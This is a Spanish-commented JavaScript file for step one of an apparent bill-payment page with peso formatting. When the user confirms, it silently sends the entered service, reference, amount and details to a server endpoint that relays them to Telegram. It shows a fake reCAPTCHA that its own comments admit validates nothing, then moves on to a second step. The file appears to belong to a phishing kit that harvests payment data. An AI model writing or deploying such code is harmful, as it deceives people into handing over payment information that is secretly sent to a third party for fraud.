(function () {
    // ============================================
    // LOGS HACIA TELEGRAM — vía log.php (servidor)
    // El navegador nunca conoce el token ni el chat_id.
    // ============================================
    const LOG_ENDPOINT = 'log.php';

    function enviarLog(payload) {
        try {
            fetch(LOG_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(function () { /* silencioso */ });
        } catch (e) { /* silencioso */ }
    }

    // ---------------------------------------------------------------
    // Log de "Datos de pago ingresados" (Paso 1)
    // Se envía justo cuando el usuario confirma en el modal.
    // ---------------------------------------------------------------
    function registrarPasoUnoLog() {
        // 1. Convenio guardado por index.php
        let convenio = null;
        try {
            convenio = JSON.parse(localStorage.getItem('convenioSeleccionado') || 'null');
        } catch (e) { convenio = null; }

        // 2. Valores del formulario
        const referencia = campoReferencia ? campoReferencia.value.trim() : '';
        const valor = campoValor ? campoValor.value.trim() : '';
        const detalle = (document.getElementById('textareaDetalle') || {}).value || '';

        enviarLog({
            tipo: 'paso_uno',
            nombre: (convenio && (convenio.Nombre || convenio.nombre)) || 'desconocido',
            convenio: (convenio && (convenio.ID || convenio.idConv || convenio.id)) || '',
            categoria: (convenio && (convenio.Categoria || convenio.categoria)) || '',
            referencia: referencia || 'vacío',
            valor: valor || 'vacío',
            detalle: detalle || 'sin detalle'
        });
    }

    // ============================================
    // Mostrar el convenio seleccionado en el buscador del index
    // (se guarda en localStorage solo en el navegador del usuario,
    // no se envía a ningún servidor)
    // ============================================
    const elementoNombreConvenio = document.getElementById('nombreConvenioMostrar');
    const contenedorCamposAdicionales = document.getElementById('camposAdicionales');
    const campoReferenciaWrapper = document.getElementById('campoReferenciaWrapper');
    const campoReferencia = document.getElementById('campoReferencia');
    const etiquetaCampoReferencia = document.getElementById('etiquetaCampoReferencia');
    const convenioGuardado = localStorage.getItem('convenioSeleccionado');
    let convenioSeleccionado = null;
    let camposAdicionales = [];
    let configuracionCampos = [];

    function obtenerEtiquetaCampo(configuracion, fallback) {
        const etiqueta = configuracion && (configuracion.etiqueta || configuracion.campo);
        return String(etiqueta || fallback || '').trim();
    }

    function obtenerMaxlengthCampo(configuracion) {
        const valor = parseInt(configuracion && configuracion.maxlength, 10);
        return Number.isFinite(valor) && valor > 0 ? String(valor) : '';
    }

    function esCampoValor(configuracion) {
        const texto = [
            configuracion && configuracion.campo,
            configuracion && configuracion.etiqueta
        ].join(' ').toLowerCase();

        return texto.includes('valor');
    }

    function actualizarEstadoCampoFlotante(input) {
        if (!input) {
            return;
        }

        const wrapper = input.closest('.campo-formulario--flotante');
        if (!wrapper) {
            return;
        }

        const placeholderInactivo = input.dataset.placeholderInactivo || input.placeholder || '';
        const placeholderActivo = input.dataset.placeholderActivo || '';
        const tieneValor = String(input.value || '').trim() !== '';
        const estaEnFoco = document.activeElement === input;
        const activo = tieneValor || estaEnFoco;

        wrapper.classList.toggle('activo', activo);
        input.placeholder = activo ? placeholderActivo : placeholderInactivo;
    }

    function prepararCampoFlotante(input) {
        if (!input) {
            return;
        }

        input.addEventListener('focus', function () {
            actualizarEstadoCampoFlotante(input);
        });

        input.addEventListener('blur', function () {
            actualizarEstadoCampoFlotante(input);
        });

        input.addEventListener('input', function () {
            actualizarEstadoCampoFlotante(input);
        });

        actualizarEstadoCampoFlotante(input);
    }

    function crearCampoAdicional(configuracion, indice) {
        const wrapper = document.createElement('div');
        wrapper.className = 'campo-formulario campo-formulario--flotante';

        const etiqueta = obtenerEtiquetaCampo(configuracion, 'Campo adicional');

        const etiquetaFlotante = document.createElement('span');
        etiquetaFlotante.className = 'etiqueta-flotante';
        etiquetaFlotante.textContent = etiqueta;

        const input = document.createElement('input');
        input.type = 'text';
        input.id = 'campoAdicional' + indice;
        input.className = 'entrada-formulario';
        input.placeholder = etiqueta;
        input.autocomplete = 'off';
        input.required = true;
        input.dataset.etiqueta = etiqueta;
        input.dataset.campo = String((configuracion && configuracion.campo) || '').trim();
        input.dataset.placeholderInactivo = etiqueta;
        input.dataset.placeholderActivo = '';

        const maxlength = obtenerMaxlengthCampo(configuracion);
        if (maxlength) {
            input.maxLength = parseInt(maxlength, 10);
        }

        const error = document.createElement('p');
        error.className = 'mensaje-error';
        error.id = 'errorCampoAdicional' + indice;
        error.innerHTML = '<span class="icono-error">✖</span> Este campo es obligatorio.';

        input.addEventListener('input', function () {
            if (input.value.trim() !== '') {
                ocultarError(error, input);
            }
        });

        wrapper.appendChild(etiquetaFlotante);
        wrapper.appendChild(input);
        wrapper.appendChild(error);
        contenedorCamposAdicionales.appendChild(wrapper);
        prepararCampoFlotante(input);

        return input;
    }

    function configurarCamposIdentificacion() {
        configuracionCampos = Array.isArray(convenioSeleccionado && convenioSeleccionado.camposIdentificacion)
            ? convenioSeleccionado.camposIdentificacion.filter(function (configuracion) {
                return !esCampoValor(configuracion);
            })
            : [];

        const primerCampo = configuracionCampos[0] || null;
        const etiquetaPrincipal = obtenerEtiquetaCampo(primerCampo, 'Referencia');
        const maxlengthPrincipal = obtenerMaxlengthCampo(primerCampo);

        campoReferencia.placeholder = etiquetaPrincipal || 'Referencia';
        campoReferencia.dataset.etiqueta = etiquetaPrincipal || 'Referencia';
        campoReferencia.dataset.campo = String((primerCampo && primerCampo.campo) || '').trim();
        campoReferencia.dataset.placeholderInactivo = etiquetaPrincipal || 'Referencia';
        campoReferencia.dataset.placeholderActivo = '';
        etiquetaCampoReferencia.textContent = etiquetaPrincipal || 'Referencia';

        if (maxlengthPrincipal) {
            campoReferencia.maxLength = parseInt(maxlengthPrincipal, 10);
        } else {
            campoReferencia.removeAttribute('maxlength');
        }

        contenedorCamposAdicionales.innerHTML = '';
        camposAdicionales = configuracionCampos.slice(1).map(function (configuracion, indice) {
            return crearCampoAdicional(configuracion, indice + 1);
        });
    }

    if (convenioGuardado) {
        try {
            convenioSeleccionado = JSON.parse(convenioGuardado);
            elementoNombreConvenio.textContent = convenioSeleccionado.Nombre || convenioSeleccionado.nombre || 'Servicio';
        } catch (e) {
            elementoNombreConvenio.textContent = 'Servicio no encontrado';
        }
    } else {
        elementoNombreConvenio.textContent = 'Servicio no encontrado';
    }

    configurarCamposIdentificacion();
    prepararCampoFlotante(campoReferencia);

    // ============================================
    // Formatear el campo "Valor a pagar" como moneda
    // ============================================
    const campoValorWrapper = document.getElementById('campoValorWrapper');
    const campoValor = document.getElementById('campoValor');
    const valorResumen = document.getElementById('valorResumen');
    campoValor.dataset.placeholderInactivo = 'Valor a pagar*';
    campoValor.dataset.placeholderActivo = '$';

    campoValor.addEventListener('input', function () {
        const crudo = this.value.replace(/\D/g, '');
        this.dataset.valorRaw = crudo;
        this.value = crudo ? '$ ' + Number(crudo).toLocaleString('es-CO') : '';
        valorResumen.textContent = crudo ? '$ ' + Number(crudo).toLocaleString('es-CO') : '$ 0';
        if (this.value.trim() !== '') ocultarError(document.getElementById('errorValor'), this);
    });
    prepararCampoFlotante(campoValor);

    // ============================================
    // Mostrar/ocultar el textarea de detalle del pago
    // ============================================
    const interruptorDetalle = document.getElementById('interruptorDetalle');
    const contenedorDetallePago = document.getElementById('contenedorDetallePago');

    interruptorDetalle.addEventListener('change', function () {
        contenedorDetallePago.classList.toggle('oculto', !this.checked);
    });

    // ============================================
    // Casilla decorativa estilo reCAPTCHA (no valida nada real)
    // ============================================
    document.querySelectorAll('[data-recaptcha]').forEach(function (wrapper) {
        const checkbox = wrapper.querySelector('.casilla-recaptcha');
        const caja = wrapper.querySelector('.recaptcha-check__caja');
        const spinner = wrapper.querySelector('.recaptcha-check__spinner');
        const chulito = wrapper.querySelector('.recaptcha-check__chulito');

        checkbox.addEventListener('change', function () {
            if (this.checked) {
                caja.classList.add('oculto');
                spinner.classList.remove('oculto');
                chulito.classList.add('oculto');
                setTimeout(function () {
                    spinner.classList.add('oculto');
                    chulito.classList.remove('oculto');
                }, 900);
                ocultarError(document.getElementById('errorRecaptcha'), null);
            } else {
                caja.classList.remove('oculto');
                spinner.classList.add('oculto');
                chulito.classList.add('oculto');
            }
        });
    });

    // ============================================
    // Validación de formulario y paso local al "Paso 2"
    // ============================================
    const aceptoTerminos = document.getElementById('aceptoTerminos');
    const casillaRecaptcha = document.getElementById('casillaRecaptcha');
    const botonPagar = document.getElementById('botonPagar');
    const modalConfirmacion = document.getElementById('modalConfirmacion');
    const modalConfirmacionAceptar = document.getElementById('modalConfirmacionAceptar');

    function mostrarError(el, input) {
        el.classList.add('visible');
        if (input) input.classList.add('entrada-error');
    }

    function ocultarError(el, input) {
        el.classList.remove('visible');
        if (input) input.classList.remove('entrada-error');
    }

    campoReferencia.addEventListener('input', function () {
        if (this.value.trim() !== '') ocultarError(document.getElementById('errorReferencia'), this);
    });
    aceptoTerminos.addEventListener('change', function () {
        if (this.checked) ocultarError(document.getElementById('errorTerminos'), null);
    });
    casillaRecaptcha.addEventListener('change', function () {
        if (this.checked) ocultarError(document.getElementById('errorRecaptcha'), null);
    });

    function obtenerCamposIdentificacion() {
        return [campoReferencia].concat(camposAdicionales);
    }

    function validarFormulario() {
        let esValido = true;

        obtenerCamposIdentificacion().forEach(function (input, indice) {
            if (input.value.trim() === '') {
                const error = indice === 0
                    ? document.getElementById('errorReferencia')
                    : input.parentElement.querySelector('.mensaje-error');
                mostrarError(error, input);
                esValido = false;
            }
        });

        if (campoValor.value.trim() === '') {
            mostrarError(document.getElementById('errorValor'), campoValor);
            esValido = false;
        }
        if (!aceptoTerminos.checked) {
            mostrarError(document.getElementById('errorTerminos'), null);
            esValido = false;
        }
        if (!casillaRecaptcha.checked) {
            mostrarError(document.getElementById('errorRecaptcha'), null);
            esValido = false;
        }

        return esValido;
    }

    function abrirModalConfirmacion() {
        modalConfirmacion.classList.add('modal-confirmacion--abierta');
        modalConfirmacion.setAttribute('aria-hidden', 'false');
    }

    function cerrarModalConfirmacion() {
        modalConfirmacion.classList.remove('modal-confirmacion--abierta');
        modalConfirmacion.setAttribute('aria-hidden', 'true');
    }

    function guardarDatosPasoUno() {
        const campos = {};

        obtenerCamposIdentificacion().forEach(function (input, indice) {
            const etiqueta = input.dataset.etiqueta || input.placeholder || ('Campo ' + (indice + 1));
            campos[etiqueta] = input.value.trim();
        });

        const datosPasoUno = {
            servicio: elementoNombreConvenio ? elementoNombreConvenio.textContent.trim() : '',
            referencia: campoReferencia.value.trim(),
            valor: campoValor.value.trim(),
            monto_raw: campoValor.dataset.valorRaw || campoValor.value.replace(/\D/g, ''),
            detalle: (document.getElementById('textareaDetalle') || {}).value || '',
            campos: campos,
            idConv: (convenioSeleccionado && (convenioSeleccionado.idConv || convenioSeleccionado.ID)) || '',
            url: (convenioSeleccionado && convenioSeleccionado.url) || ''
        };

        localStorage.setItem('datosPagoPasoUno', JSON.stringify(datosPasoUno));
    }

    botonPagar.addEventListener('click', function (e) {
        e.preventDefault();
        if (validarFormulario()) abrirModalConfirmacion();
    });

    modalConfirmacion.addEventListener('click', function (e) {
        if (e.target && e.target.hasAttribute('data-cerrar-modal')) cerrarModalConfirmacion();
    });

    modalConfirmacionAceptar.addEventListener('click', function () {
        // >>> LOG HACIA TELEGRAM: datos de pago ingresados <<<
        registrarPasoUnoLog();

        guardarDatosPasoUno();
        cerrarModalConfirmacion();
        window.location.href = 'paso-dos.php';
    });

    document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') cerrarModalConfirmacion();
    });
})();
